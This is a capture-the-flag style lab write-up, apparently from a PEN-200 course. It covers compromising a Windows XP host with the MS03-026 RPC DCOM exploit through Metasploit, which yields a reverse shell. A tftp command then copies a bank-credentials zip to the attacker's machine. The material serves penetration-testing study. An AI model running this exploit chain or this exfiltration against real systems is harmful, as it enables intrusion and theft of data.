---
description: Simple machine that looked like EternalBlue, but it wasn't.
---

# Alice

First, let's scan the box with nmap.

```
┌──(kali㉿kali)-[~/pen200/10.11.1.5]
└─$ cat nmap.scan      
...
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: alice
|   NetBIOS computer name: ALICE\x00
|   Domain name: thinc.local
|   Forest name: thinc.local
|   FQDN: alice.thinc.local
|_  System time: 2023-01-26T02:18:34+00:00
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: ALICE, NetBIOS user: <unknown>, NetBIOS MAC: 0050568678dd (VMware)
| Names:
|   ALICE<00>            Flags: <unique><active>
|   ALICE<20>            Flags: <unique><active>
|   THINC<00>            Flags: <group><active>
|   ALICE<03>            Flags: <unique><active>
|   THINC<1e>            Flags: <group><active>
|   THINC<1d>            Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
```

We can see that the machine is running Windows XP, which is a good giveaway for some retro exploits. I'll search in exploit db for windows rpc exploits.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

MS03-026 looks promising, so I'll both download the c file provided and compile it but also load it up in metasploit. Note that I changed the payload earlier because XP is an older OS , so meterpreter and x64 shells aren't guaranteed to work.

```
┌──(kali㉿kali)-[~/pen200/10.11.1.5/exploit]
└─$ gcc 66.c -o ms03-026
...
msf6 > search ms03-026

Matching Modules
================

#  Name                                  Disclosure Date  Rank   Check  Description
-  ----                                  ---------------  ----   -----  -----------
0  exploit/windows/dcerpc/ms03_026_dcom  2003-07-16       great  Yes    MS03-026 Microsoft RPC DCOM Interface Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/dcerpc/ms03_026_dcom

msf6 > use 0
[*] Using configured payload windows/shell/reverse_tcp
msf6 exploit(windows/dcerpc/ms03_026_dcom) > set payload 2
msf6 exploit(windows/dcerpc/ms03_026_dcom) > set RHOST 10.11.1.5
RHOST => 10.11.1.5
msf6 exploit(windows/dcerpc/ms03_026_dcom) > set LHOST 192.168.119.162
LHOST => 192.168.119.162
msf6 exploit(windows/dcerpc/ms03_026_dcom) > exploit

[*] Started reverse TCP handler on 192.168.119.162:4444
[*] 10.11.1.5:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
[*] 10.11.1.5:135 - Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:10.11.1.5[135] ...
[*] 10.11.1.5:135 - Calling DCOM RPC with payload (1648 bytes) ...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.11.1.5
[*] Command shell session 1 opened (192.168.119.162:4444 -> 10.11.1.5:1196) at 2023-01-26 20:33:27 -0600


Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
-----


C:\WINDOWS\system32>
```

Shell acquired. We can then transfer the bank\_credentials.zip file to our host system with tftp.

```
┌──(kali㉿kali)-[~/pen200/10.11.1.5/exploit]
└─$ sudo atftpd --daemon --port 69 /tftp
```

```
C:\>tftp -i 192.168.119.162 put bank-account.zip
tftp -i 192.168.119.162 put bank-account.zip
Transfer successful: 2081 bytes in 1 second, 2081 bytes/s
```

We can hold onto this for later and other boxes.
